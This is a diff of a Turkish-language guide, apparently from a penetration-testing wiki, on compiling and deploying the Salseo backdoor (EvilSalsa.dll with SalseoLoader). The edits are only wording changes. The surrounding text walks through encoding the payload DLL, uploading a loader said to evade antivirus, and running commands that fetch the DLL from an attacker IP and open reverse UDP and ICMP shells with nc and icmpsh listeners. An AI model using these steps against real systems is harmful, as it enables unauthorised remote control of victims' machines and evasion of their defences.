@@ -6,21 +6,21 @@
 
 Github'dan kaynak kodunu indirin ve **EvilSalsa** ile **SalseoLoader**'ı derleyin. Kodu derlemek için **Visual Studio**'nun yüklü olması gerekmektedir.
 
-Bu projeleri, kullanacağınız Windows kutusunun mimarisi için derleyin (Eğer Windows x64 destekliyorsa, bu mimariler için derleyin).
+Bu projeleri, kullanacağınız Windows kutusunun mimarisi için derleyin (Eğer Windows x64 destekliyorsa, o mimari için derleyin).
 
 **Mimariyi seçebilirsiniz** Visual Studio'da **sol "Build" Sekmesi** içindeki **"Platform Target"** kısmında.
 
-(\*\*Bu seçenekleri bulamazsanız **"Project Tab"**'ına tıklayın ve ardından **"\<Project Name> Properties"**'e tıklayın)
+(**Bu seçenekleri bulamazsanız **"Project Tab"**'ına tıklayın ve ardından **"\<Project Name> Properties"**'e tıklayın)
 
 ![](<../images/image (132).png>)
 
-Sonra, her iki projeyi de derleyin (Build -> Build Solution) (Kayıtlarda çalıştırılabilir dosyanın yolu görünecektir):
+Sonra, her iki projeyi de derleyin (Build -> Build Solution) (Kayıtlar içinde çalıştırılabilir dosyanın yolu görünecektir):
 
 ![](<../images/image (1) (2) (1) (1) (1).png>)
 
 ## Arka Kapıyı Hazırlama
 
-Öncelikle, **EvilSalsa.dll**'yi kodlamanız gerekecek. Bunu yapmak için, **encrypterassembly.py** python betiğini kullanabilir veya **EncrypterAssembly** projesini derleyebilirsiniz:
+Öncelikle, **EvilSalsa.dll**'yı kodlamanız gerekecek. Bunu yapmak için, **encrypterassembly.py** python betiğini kullanabilir veya **EncrypterAssembly** projesini derleyebilirsiniz:
 
 ### **Python**
 ```
@@ -32,7 +32,7 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-Tamam, şimdi Salseo işlemlerini gerçekleştirmek için her şeye sahipsin: **encoded EvilDalsa.dll** ve **SalseoLoader'ın binary'si.**
+Tamam, şimdi Salseo ile ilgili her şeyi gerçekleştirmek için her şeye sahipsin: **encoded EvilDalsa.dll** ve **SalseoLoader'ın binary'si.**
 
 **SalseoLoader.exe binary'sini makineye yükle. Hiçbir antivirüs tarafından tespit edilmemelidir...**
 
@@ -50,7 +50,7 @@ Ters shell dinleyicisi olarak bir nc başlatmayı ve kodlanmış evilsalsa'yı s
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
-### **ICMP ters shell almak (şifrelenmiş dll zaten kurbanın içinde)**
+### **ICMP ters shell almak (kurbanın içinde kodlanmış dll zaten mevcut)**
 
 **Bu sefer ters shell almak için istemcide özel bir araca ihtiyacınız var. İndirin:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
@@ -61,7 +61,7 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=1
 #You finish, you can enable it again running:
 sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
-#### İstemciyi çalıştırın:
+#### İstemciyi çalıştır:
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
@@ -83,7 +83,7 @@ SalseoLoader projesini Visual Studio ile açın.
 
 ![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **DllExport paketini arayın (Gözat sekmesini kullanarak) ve Yükle'ye basın (ve açılan pencerede kabul edin)**
+#### **DllExport paketini arayın (Gözat sekmesini kullanarak) ve Yükle'ye basın (ve açılan pencereyi kabul edin)**
 
 ![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
@@ -121,7 +121,7 @@ Sonra, **SalseoLoader klasörünüze** gidin ve **DllExport_Configure.bat**'ı �
 
 ![](<../images/image (9) (1) (1).png>)
 
-Çözümü **derlemek için**: Derle --> Çözümü Derle (Çıktı konsolunda yeni DLL'nin yolu görünecektir)
+Çözümü **derlemek** için: Derle --> Çözümü Derle (Çıktı konsolunda yeni DLL'nin yolu görünecektir)
 
 ### Üretilen Dll'yi test edin
 
@@ -135,7 +135,7 @@ Eğer hata görünmüyorsa, muhtemelen işlevsel bir DLL'niz var!!
 
 ## DLL kullanarak bir shell alın
 
-Bir **HTTP** **sunucusu** kullanmayı ve bir **nc** **dinleyicisi** ayarlamayı unutmayın
+Bir **HTTP** **sunucusu** kullanmayı ve bir **nc** **dinleyicisi** ayarlamayı unutmayın.
 
 ### Powershell
 ```
